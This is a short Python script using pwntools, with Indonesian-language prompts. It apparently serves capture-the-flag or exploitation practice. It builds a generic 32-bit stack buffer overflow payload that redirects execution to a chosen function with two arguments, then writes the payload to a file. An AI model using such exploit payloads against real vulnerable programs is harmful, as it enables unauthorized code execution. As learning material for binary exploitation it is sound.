from pwn import *
import os

def create_payload():
    if not os.path.exists("result"):
        os.makedirs("result")

    print("[*] Masukkan offset/padding yang dibutuhkan untuk mencapai return address")
    input_padding = int(input("[>] Masukan Offset: "))
    padding = b"A" * input_padding

    print("[*] Masukkan alamat fungsi target")
    input_hacker_addr = int(input("[>] Masukan Alamat Target (hex): "), 16)
    hacked_addr = p32(input_hacker_addr)

    print("[*] Masukkan nilai parameter pertama")
    input_param1 = int(input("[>] Masukan Parameter 1 (hex): "), 16)
    param1 = p32(input_param1)

    print("[*] Masukkan nilai parameter kedua")
    input_param2 = int(input("[>] Masukan Parameter 2 (hex): "), 16)
    param2 = p32(input_param2)

    ret_addr = p32(0x0)

    print("[+] Membuat payload...")
    payload = padding + hacked_addr + ret_addr + param1 + param2

    print("[+] Menyimpan payload ke file 'result/payload_32x'")
    with open("result/payload_32x", "wb") as f:
        f.write(payload)
    print("[+] Payload berhasil dibuat!")
